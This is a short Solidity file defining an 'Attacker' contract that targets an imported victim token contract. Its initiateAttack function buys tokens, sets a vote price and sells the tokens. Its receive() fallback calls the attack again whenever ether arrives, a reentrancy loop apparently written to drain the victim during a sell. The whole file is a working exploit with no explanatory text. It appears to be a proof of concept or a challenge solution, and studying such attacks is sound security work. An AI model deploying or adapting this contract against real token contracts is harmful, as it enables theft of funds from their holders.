// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./IVictim.sol";

contract Attacker {
    address payable public owner; 
    uint256 public priceToVote;
    IVictim private victimContract;

    event Received(address, uint);

    constructor(address _victimContract, uint256 _priceToVote) {
        victimContract = IVictim(_victimContract);
        priceToVote = _priceToVote;
        owner = payable(msg.sender);
    }

    function initiateAttack() external payable {
        victimContract.buy{value: msg.value}();
        victimContract.vote(priceToVote);

        uint256 tokensToSell = victimContract.balanceOf(address(this));
        victimContract.sell(tokensToSell);
    }

    receive() external payable {
        this.initiateAttack{value: msg.value}();
        emit Received(msg.sender, msg.value);
    }
}